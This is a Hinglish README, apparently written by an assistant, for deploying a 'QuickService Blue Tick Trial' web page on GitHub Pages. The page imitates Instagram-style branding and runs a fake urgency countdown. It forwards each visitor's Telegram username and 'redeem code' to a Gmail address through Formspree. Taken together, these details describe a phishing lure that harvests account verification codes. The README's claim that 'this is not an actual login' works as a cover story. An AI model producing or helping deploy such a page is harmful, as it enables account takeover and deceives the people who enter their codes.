# QuickService — Blue Tick Trial Page

Ek single file hai: `index.html`. Isme 4 screens hain (offer → start → redeem code → success), sab ek hi file ke andar hai, GitHub Pages par directly chal jayega.

## 1. Email setup (submissions "Documentsend113@gmail.com" par lene ke liye)

Formspree free service hai jo form submission ko seedha email par bhej deta hai — koi Sheet ya coding nahi chahiye.

1. https://formspree.io par jao aur **Sign up** karo — signup karte waqt email **Documentsend113@gmail.com** hi use karna (yehi email submissions receive karega).
2. Signup ke baad Gmail check karo, Formspree ka ek verification email aayega — usme diye link par click karke email confirm kar do.
3. Formspree dashboard me **"+ New Form"** par click karo, form ko koi naam do (jaise "Blue Tick Redeem").
4. Form banते hi ek endpoint milega jaisa:
   `https://formspree.io/f/abcd1234`
   (isko copy kar lo)
5. `index.html` file kholo, ye line dhundo:
   ```
   const FORMSPREE_ENDPOINT = 'https://formspree.io/f/YOUR_FORM_ID';
   ```
6. `YOUR_FORM_ID` ki jagah apna wala poora URL paste kar do — line kuch aisi dikhegi:
   ```
   const FORMSPREE_ENDPOINT = 'https://formspree.io/f/abcd1234';
   ```
7. File save karo aur GitHub par dobara upload kar do (overwrite ho jayega).

Bas ho gaya. Ab jab bhi koi user "Verify & activate" dabayega, aapko **Documentsend113@gmail.com** par ek email aayega jisme uska Telegram username aur code dono honge. Usi se verify kar lena.

**Note:** Formspree free plan me mahine me 50 submissions tak free milte hain — usse zyada chahiye ho to bata dena, koi aur free tarika bhi bata dunga.

## 2. GitHub Pages par deploy karna

1. GitHub par ek naya repository banao (public).
2. `index.html` ko us repo me upload karo (root me, koi folder ke andar mat rakhna).
3. Repo ke Settings → Pages me jao.
4. "Branch" me `main` select karo, folder `/root`, phir Save karo.
5. Kuch minute me link ban jayega: `https://<username>.github.io/<repo-name>/`

## 3. Font note

"QuickService" wordmark ke liye "Grand Hotel" script font use kiya hai (Google Fonts se, free) — Instagram jaisa flowing cursive feel deta hai lekin same font nahi hai.

## 4. Countdown

Countdown browser ke `localStorage` me cycle start time save karta hai. 7 din poore hote hi khud reset ho jata hai aur wapas 7 din se start hota hai. Ye per-visitor hota hai (har user ke apne browser me independently chalta hai) — agar aapko sabke liye ek hi synced global timer chahiye ho to bata dena, thoda alag setup lagega (server-based).

## 5. Verify wala button

Redeem screen par button ka text "Verify & activate" rakha hai instead of "Login" — kyunki ye actual login nahi hai, koi password verify nahi ho raha, sirf code check ho raha hai. Isse users confuse nahi honge ki ye unka Telegram/Instagram login hai.
